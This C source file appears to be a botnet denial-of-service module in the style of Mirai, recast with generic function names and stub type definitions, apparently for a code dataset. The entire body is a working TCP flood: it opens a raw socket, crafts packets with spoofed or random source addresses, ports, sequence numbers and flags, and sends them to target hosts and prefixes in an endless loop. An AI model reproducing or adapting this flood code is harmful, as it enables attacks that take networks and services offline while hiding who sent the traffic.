#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  int uint8_t ;
typedef  int uint32_t ;
typedef  int uint16_t ;
struct tcphdr {int source; int dest; int seq; int doff; int psh; int window; int ack_seq; scalar_t__ check; void* fin; void* syn; void* rst; void* ack; void* urg; } ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
struct iphdr {int version; int ihl; int tos; int id; int ttl; int saddr; scalar_t__ check; int /*<<< orphan*/  daddr; int /*<<< orphan*/  protocol; void* frag_off; void* tot_len; } ;
struct TYPE_2__ {int sin_port; } ;
struct attack_target {int netmask; TYPE_1__ sock_addr; int /*<<< orphan*/  addr; } ;
struct attack_option {int dummy; } ;
typedef  int port_t ;
typedef  void* BOOL ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  ATK_OPT_ACK ; 
 int /*<<< orphan*/  ATK_OPT_ACKRND ; 
 int /*<<< orphan*/  ATK_OPT_DPORT ; 
 int /*<<< orphan*/  ATK_OPT_FIN ; 
 int /*<<< orphan*/  ATK_OPT_IP_DF ; 
 int /*<<< orphan*/  ATK_OPT_IP_IDENT ; 
 int /*<<< orphan*/  ATK_OPT_IP_TOS ; 
 int /*<<< orphan*/  ATK_OPT_IP_TTL ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_RAND ; 
 int /*<<< orphan*/  ATK_OPT_PAYLOAD_SIZE ; 
 int /*<<< orphan*/  ATK_OPT_PSH ; 
 int /*<<< orphan*/  ATK_OPT_RST ; 
 int /*<<< orphan*/  ATK_OPT_SEQRND ; 
 int /*<<< orphan*/  ATK_OPT_SOURCE ; 
 int /*<<< orphan*/  ATK_OPT_SPORT ; 
 int /*<<< orphan*/  ATK_OPT_SYN ; 
 int /*<<< orphan*/  ATK_OPT_URG ; 
 int FALSE ; 
 int /*<<< orphan*/  IPPROTO_IP ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  IP_HDRINCL ; 
 int /*<<< orphan*/  LOCAL_ADDR ; 
 int /*<<< orphan*/  MSG_NOSIGNAL ; 
 int /*<<< orphan*/  SOCK_RAW ; 
 int TRUE ; 
 void* FUNC0 (int,struct attack_option*,int /*<<< orphan*/ ,int) ; 
 int FUNC1 (int,struct attack_option*,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 void* FUNC2 (int,int) ; 
 scalar_t__ FUNC3 (int*,int) ; 
 scalar_t__ FUNC4 (struct iphdr*,struct tcphdr*,void*,int) ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC6 (scalar_t__) ; 
 void* FUNC7 (int) ; 
 scalar_t__ FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*,...) ; 
 int FUNC10 () ; 
 int /*<<< orphan*/  FUNC11 (char*,int) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int,int /*<<< orphan*/ ,struct sockaddr*,int) ; 
 int FUNC13 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*,int) ; 
 int FUNC14 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 

void FUNC15(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = FUNC2(targs_len, sizeof (char *));
    uint8_t ip_tos = FUNC0(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = FUNC0(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = FUNC0(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = FUNC0(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t sport = FUNC0(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = FUNC0(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    uint32_t seq = FUNC0(opts_len, opts, ATK_OPT_SEQRND, 0xffff);
    uint32_t ack = FUNC0(opts_len, opts, ATK_OPT_ACKRND, 0xffff);
    BOOL urg_fl = FUNC0(opts_len, opts, ATK_OPT_URG, FALSE);
    BOOL ack_fl = FUNC0(opts_len, opts, ATK_OPT_ACK, TRUE);
    BOOL psh_fl = FUNC0(opts_len, opts, ATK_OPT_PSH, FALSE);
    BOOL rst_fl = FUNC0(opts_len, opts, ATK_OPT_RST, FALSE);
    BOOL syn_fl = FUNC0(opts_len, opts, ATK_OPT_SYN, FALSE);
    BOOL fin_fl = FUNC0(opts_len, opts, ATK_OPT_FIN, FALSE);
    int data_len = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = FUNC0(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    uint32_t source_ip = FUNC1(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    if ((fd = FUNC14(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }
    i = 1;
    if (FUNC13(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        FUNC5(fd);
        return;
    }

    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct tcphdr *tcph;
        char *payload;

        pkts[i] = FUNC2(1510, sizeof (char));
        iph = (struct iphdr *)pkts[i];
        tcph = (struct tcphdr *)(iph + 1);
        payload = (char *)(tcph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = FUNC7(sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len);
        iph->id = FUNC7(ip_ident);
        iph->ttl = ip_ttl;
        if (dont_frag)
            iph->frag_off = FUNC7(1 << 14);
        iph->protocol = IPPROTO_TCP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        tcph->source = FUNC7(sport);
        tcph->dest = FUNC7(dport);
        tcph->seq = FUNC7(seq);
        tcph->doff = 5;
        tcph->urg = urg_fl;
        tcph->ack = ack_fl;
        tcph->psh = psh_fl;
        tcph->rst = rst_fl;
        tcph->syn = syn_fl;
        tcph->fin = fin_fl;
        tcph->window = FUNC10() & 0xffff;
        if (psh_fl)
            tcph->psh = TRUE;

        FUNC11(payload, data_len);
    }

//    targs[0].sock_addr.sin_port = tcph->dest;
//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
//    {
//
//    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            // For prefix attacks
            if (targs[i].netmask < 32)
                iph->daddr = FUNC6(FUNC8(targs[i].addr) + (((uint32_t)FUNC10()) >> targs[i].netmask));

            if (source_ip == 0xffffffff)
                iph->saddr = FUNC10();
            if (ip_ident == 0xffff)
                iph->id = FUNC10() & 0xffff;
            if (sport == 0xffff)
                tcph->source = FUNC10() & 0xffff;
            if (dport == 0xffff)
                tcph->dest = FUNC10() & 0xffff;
            if (seq == 0xffff)
                tcph->seq = FUNC10();
            if (ack == 0xffff)
                tcph->ack_seq = FUNC10();

            // Randomize packet content?
            if (data_rand)
                FUNC11(data, data_len);

            iph->check = 0;
            iph->check = FUNC3((uint16_t *)iph, sizeof (struct iphdr));

            tcph->check = 0;
            tcph->check = FUNC4(iph, tcph, FUNC7(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);

            targs[i].sock_addr.sin_port = tcph->dest;
            FUNC12(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
        }
#ifdef DEBUG
            break;
            if (errno != 0)
                printf("errno = %d\n", errno);
#endif
    }
}